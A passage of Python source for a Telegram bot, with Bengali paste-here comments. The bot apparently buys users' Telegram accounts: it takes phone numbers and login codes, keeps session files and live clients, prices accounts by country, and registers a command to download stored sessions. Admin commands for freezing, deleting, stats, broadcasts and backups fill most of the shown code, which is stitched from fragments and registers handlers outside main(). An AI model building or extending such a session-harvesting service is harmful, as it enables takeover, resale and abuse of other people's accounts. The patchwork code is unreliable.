async def frozen_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    frozen = get_frozen()
    if not frozen:
        await update.message.reply_text("No frozen accounts.")
        return

    text = f"❄️ **Frozen Accounts ({len(frozen)})**\n\n"
    for i, (phone, info) in enumerate(list(frozen.items())[:30], 1):
        text += f"{i}. `{phone}` - {info.get('reason', '')}\n"

    await update.message.reply_text(text, parse_mode="Markdown")


# ====================== UPDATE handle_phone (Frozen Check) ======================
# handle_phone ফাংশনের শুরুতে এই চেকটা যোগ করো:

"""
    if is_frozen(phone):
        await update.message.reply_text(f"❄️ This number is frozen.\n`{phone}`", parse_mode="Markdown")
        return
"""


# ====================== MAIN এ নতুন কমান্ড রেজিস্টার করো ======================
# main() ফাংশনে এই লাইনগুলো যোগ করো:

"""
    app.add_handler(CommandHandler("dsession", download_user_sessions))
    app.add_handler(CommandHandler("freeze", freeze_cmd))
    app.add_handler(CommandHandler("unfreeze", unfreeze_cmd))
    app.add_handler(CommandHandler("frozen", frozen_list))
"""
# ====================== BOT ON/OFF + COUNTRY SETTINGS ======================

BOT_STATUS_FILE = f"{DATA_DIR}/bot_status.json"
COUNTRY_SETTINGS_FILE = f"{DATA_DIR}/country_settings.json"

def is_bot_on():
    status = load_json(BOT_STATUS_FILE, {"on": True})
    return status.get("on", True)

def set_bot_status(status: bool):
    save_json(BOT_STATUS_FILE, {"on": status})

def get_country_setting(country_code):
    settings = load_json(COUNTRY_SETTINGS_FILE, {})
    return settings.get(str(country_code), {
        "price": get_settings()["price"],
        "wait": get_settings()["wait"]
    })

def set_country_setting(country_code, price=None, wait=None):
    settings = load_json(COUNTRY_SETTINGS_FILE, {})
    if str(country_code) not in settings:
        settings[str(country_code)] = {}
    
    if price is not None:
        settings[str(country_code)]["price"] = float(price)
    if wait is not None:
        settings[str(country_code)]["wait"] = int(wait)
        
    save_json(COUNTRY_SETTINGS_FILE, settings)


# ====================== BOT ON / OFF COMMANDS ======================
async def bot_on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    set_bot_status(True)
    await update.message.reply_text("✅ Bot is now **ON**. Users can submit numbers.", parse_mode="Markdown")


async def bot_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    set_bot_status(False)
    await update.message.reply_text("🔴 Bot is now **OFF**. Users cannot submit numbers.", parse_mode="Markdown")


# ====================== UPDATE handle_phone (Bot Status Check) ======================
# handle_phone ফাংশনের একদম শুরুতে এই কোড যোগ করো:

"""
    # Bot On/Off Check
    if not is_bot_on() and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔴 Bot is currently turned OFF by admin.\nPlease try again later.")
        return
"""


# ====================== UPDATE handle_code (Country-wise Price & Wait) ======================
# handle_code ফাংশনে settings নেওয়ার জায়গায় এই কোড ব্যবহার করো:

"""
    country_code = get_country_code(data["phone"])
    country_set = get_country_setting(country_code)
    
    price = country_set.get("price", get_settings()["price"])
    wait = country_set.get("wait", get_settings()["wait"])
"""


# এবং account ও claim সেভ করার সময় price ও wait হিসেবে উপরের ভেরিয়েবল ব্যবহার করো।


# ====================== ADMIN: Set Country Price & Wait ======================
async def set_country(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    if len(context.args) < 3:
        await update.message.reply_text(
            "Usage:\n`/setcountry 880 0.40 20`\n\n"
            "Format: /setcountry <country_code> <price> <wait_hours>",
            parse_mode="Markdown"
        )
        return

    try:
        code = context.args[0]
        price = float(context.args[1])
        wait = int(context.args[2])
        
        set_country_setting(code, price=price, wait=wait)
        
        await update.message.reply_text(
            f"✅ Country setting updated!\n\n"
            f"Country: `{code}`\n"
            f"Price: `${price}`\n"
            f"Wait: `{wait} hours`",
            parse_mode="Markdown"
        )
    except:
        await update.message.reply_text("❌ Invalid format.\nExample: `/setcountry 880 0.40 20`", parse_mode="Markdown")


# ====================== MAIN এ নতুন কমান্ড রেজিস্টার করো ======================
# main() ফাংশনে এই লাইনগুলো যোগ করো:

"""
    app.add_handler(CommandHandler("on", bot_on))
    app.add_handler(CommandHandler("off", bot_off))
    app.add_handler(CommandHandler("setcountry", set_country))
"""
# ====================== ADMIN STATS + BROADCAST ======================

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    balances = load_json(BALANCES_FILE, {})
    claims = load_json(CLAIMS_FILE, {})
    frozen = get_frozen()
    refs = load_json(REFS_FILE, {})

    total_accounts = len(accounts)
    total_users = len(set(info.get("uid") for info in accounts.values()))
    total_balance = sum(balances.values())
    pending_claims = sum(1 for c in claims.values() if not c.get("done"))
    total_frozen = len(frozen)
    total_refs = len(refs)

    # Country wise count
    country_count = {}
    for phone in accounts:
        code = get_country_code(phone)
        country_count[code] = country_count.get(code, 0) + 1

    top_countries = sorted(country_count.items(), key=lambda x: x[1], reverse=True)[:5]
    country_text = "\n".join([f"• `{c}` : {n}" for c, n in top_countries]) or "No data"

    text = (
        f"📈 **Bot Statistics**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"📱 Total Accounts: `{total_accounts}`\n"
        f"💰 Total Balance: `${total_balance:.2f}`\n"
        f"⏳ Pending Claims: `{pending_claims}`\n"
        f"❄️ Frozen Accounts: `{total_frozen}`\n"
        f"🔗 Total Referrals: `{total_refs}`\n"
        f"🟢 Online Clients: `{len(clients)}`\n\n"
        f"**Top Countries:**\n{country_text}"
    )

    await update.message.reply_text(text, parse_mode="Markdown")


async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text(
            "Usage:\n`/broadcast Your message here`",
            parse_mode="Markdown"
        )
        return

    message = " ".join(context.args)
    accounts = load_json(ACCOUNTS_FILE, {})
    user_ids = list(set(info.get("uid") for info in accounts.values() if info.get("uid")))

    success = 0
    failed = 0

    status_msg = await update.message.reply_text(f"📢 Broadcasting to {len(user_ids)} users...")

    for uid in user_ids:
        try:
            await context.bot.send_message(uid, f"📢 **Announcement**\n\n{message}", parse_mode="Markdown")
            success += 1
        except:
            failed += 1

    await status_msg.edit_text(
        f"✅ Broadcast Completed!\n\n"
        f"Success: `{success}`\n"
        f"Failed: `{failed}`",
        parse_mode="Markdown"
    )


# ====================== MAIN এ নতুন কমান্ড রেজিস্টার করো ======================
# main() ফাংশনে এই লাইনগুলো যোগ করো:

"""
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
"""
# ====================== USER PROFILE + ADMIN LOOKUP ======================

async def myaccounts_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User can see his own submitted accounts"""
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    
    user_accounts = []
    for phone, info in accounts.items():
        if info.get("uid") == uid:
            user_accounts.append(phone)

    if not user_accounts:
        await update.message.reply_text("You have not submitted any accounts yet.")
        return

    text = f"📱 **Your Accounts ({len(user_accounts)})**\n\n"
    for i, phone in enumerate(user_accounts[:30], 1):
        flag = get_flag(phone)
        frozen_mark = " ❄️" if is_frozen(phone) else ""
        text += f"{i}. {flag} `{phone}`{frozen_mark}\n"

    if len(user_accounts) > 30:
        text += f"\n... and {len(user_accounts) - 30} more"

    await update.message.reply_text(text, parse_mode="Markdown")


async def userinfo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /userinfo <user_id>"""
    if not is_admin(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text("Usage:\n`/userinfo 123456789`", parse_mode="Markdown")
        return

    try:
        target_uid = int(context.args[0])
    except:
        await update.message.reply_text("Invalid User ID")
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    balances = load_json(BALANCES_FILE, {})
    claims = load_json(CLAIMS_FILE, {})
    refs = load_json(REFS_FILE, {})

    user_phones = [phone for phone, info in accounts.items() if info.get("uid") == target_uid]
    balance = balances.get(str(target_uid), 0)
    pending = sum(1 for c in claims.values() if c.get("uid") == target_uid and not c.get("done"))
    referred_by = refs.get(str(target_uid), "None")

    text = (
        f"👤 **User Information**\n\n"
        f"• User ID: `{target_uid}`\n"
        f"• Total Accounts: `{len(user_phones)}`\n"
        f"• Balance: `${balance:.2f}`\n"
        f"• Pending Claims: `{pending}`\n"
        f"• Referred By: `{referred_by}`\n\n"
    )

    if user_phones:
        text += "**Accounts:**\n"
        for i, phone in enumerate(user_phones[:15], 1):
            flag = get_flag(phone)
            frozen_mark = " ❄️" if is_frozen(phone) else ""
            text += f"{i}. {flag} `{phone}`{frozen_mark}\n"
        if len(user_phones) > 15:
            text += f"\n... and {len(user_phones) - 15} more"

    await update.message.reply_text(text, parse_mode="Markdown")


# ====================== MAIN এ নতুন কমান্ড রেজিস্টার করো ======================
# main() ফাংশনে এই লাইনগুলো যোগ করো:

"""
    app.add_handler(CommandHandler("myaccounts", myaccounts_cmd))
    app.add_handler(CommandHandler("userinfo", userinfo_cmd))
"""
# ====================== DELETE ACCOUNT ======================

async def delete_account_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /delacc +8801712345678"""
    if not is_admin(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text(
            "Usage:\n`/delacc +8801712345678`",
            parse_mode="Markdown"
        )
        return

    phone = context.args[0].strip()
    if not phone.startswith("+"):
        phone = "+" + phone

    accounts = load_json(ACCOUNTS_FILE, {})

    if phone not in accounts:
        await update.message.reply_text(f"❌ Account not found:\n`{phone}`", parse_mode="Markdown")
        return

    # 1. Disconnect client if online
    if phone in clients:
        try:
            await clients[phone].disconnect()
            del clients[phone]
        except:
            pass

    # 2. Delete session file
    session_path = f"{SESSIONS_DIR}/{phone.replace('+','')}.session"
    journal_path = session_path + "-journal"

    try:
        if os.path.exists(session_path):
            os.remove(session_path)
        if os.path.exists(journal_path):
            os.remove(journal_path)
    except Exception as e:
        print(f"Error deleting session file: {e}")

    # 3. Remove from accounts.json
    del accounts[phone]
    save_json(ACCOUNTS_FILE, accounts)

    # 4. Remove from frozen if exists
    remove_frozen(phone)

    await update.message.reply_text(
        f"✅ Account deleted successfully!\n\n"
        f"Number: `{phone}`\n"
        f"Session file removed.\n"
        f"Removed from system.",
        parse_mode="Markdown"
    )


async def clear_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /clearuser 123456789  → Delete all accounts of a user"""
    if not is_admin(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text(
            "Usage:\n`/clearuser 123456789`",
            parse_mode="Markdown"
        )
        return

    try:
        target_uid = int(context.args[0])
    except:
        await update.message.reply_text("Invalid User ID")
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    phones_to_delete = [phone for phone, info in accounts.items() if info.get("uid") == target_uid]

    if not phones_to_delete:
        await update.message.reply_text("This user has no accounts.")
        return

    deleted = 0
    for phone in phones_to_delete:
        # Disconnect
        if phone in clients:
            try:
                await clients[phone].disconnect()
                del clients[phone]
            except:
                pass

        # Delete session file
        session_path = f"{SESSIONS_DIR}/{phone.replace('+','')}.session"
        try:
            if os.path.exists(session_path):
                os.remove(session_path)
            journal = session_path + "-journal"
            if os.path.exists(journal):
                os.remove(journal)
        except:
            pass

        # Remove from accounts
        if phone in accounts:
            del accounts[phone]

        remove_frozen(phone)
        deleted += 1

    save_json(ACCOUNTS_FILE, accounts)

    await update.message.reply_text(
        f"✅ Cleared all accounts of user `{target_uid}`\n\n"
        f"Deleted: `{deleted}` accounts",
        parse_mode="Markdown"
    )


# ====================== MAIN এ নতুন কমান্ড রেজিস্টার করো ======================
# main() ফাংশনে এই লাইনগুলো যোগ করো:

"""
    app.add_handler(CommandHandler("delacc", delete_account_cmd))
    app.add_handler(CommandHandler("clearuser", clear_user_cmd))
"""
# ====================== AUTO CLEAN + BACKUP ======================

async def clean_claims_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /cleanclaims → Delete already claimed entries older than 7 days"""
    if not is_admin(update.effective_user.id):
        return

    claims = load_json(CLAIMS_FILE, {})
    now = datetime.now()
    deleted = 0

    new_claims = {}
    for cid, data in claims.items():
        if data.get("done"):
            try:
                claim_time = datetime.fromisoformat(data["time"])
                if (now - claim_time).days > 7:
                    deleted += 1
                    continue
            except:
                pass
        new_claims[cid] = data

    save_json(CLAIMS_FILE, new_claims)

    await update.message.reply_text(
        f"🧹 Cleaned old claims!\n\n"
        f"Deleted: `{deleted}` old claimed entries.",
        parse_mode="Markdown"
    )


async def backup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /backup → Send important JSON files"""
    if not is_admin(update.effective_user.id):
        return

    import zipfile
    backup_path = f"{DATA_DIR}/backup_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"

    important_files = [
        ACCOUNTS_FILE,
        BALANCES_FILE,
        CLAIMS_FILE,
        REFS_FILE,
        SETTINGS_FILE,
        ADMINS_FILE,
        CODES_FILE,
    ]

    with zipfile.ZipFile(backup_path, "w") as zf:
        for file in important_files:
            if os.path.exists(file):
                zf.write(file, os.path.basename(file))

    await update.message.reply_document(
        document=open(backup_path, "rb"),
        filename=os.path.basename(backup_path),
        caption="📦 Bot Backup\n\nContains: accounts, balances, claims, settings, admins, codes"
    )


# ====================== MAIN এ নতুন কমান্ড রেজিস্টার করো ======================
# main() ফাংশনে এই লাইনগুলো যোগ করো:

"""
    app.add_handler(CommandHandler("cleanclaims", clean_claims_cmd))
    app.add_handler(CommandHandler("backup", backup_cmd))
"""
# Register Handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("balance", balance_cmd))
app.add_handler(CommandHandler("dashboard", dashboard))
app.add_handler(CommandHandler("cancel", cancel))

app.add_handler(login_conv)
app.add_handler(wd_conv)
app.add_handler(support_conv)

app.add_handler(CallbackQueryHandler(claim_cb, pattern=r"^claim_"))
app.add_handler(CallbackQueryHandler(admin_cb))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_edit))

print("🚀 Bot is starting...")
app.run_polling()


if __name__ == "__main__":
    main()
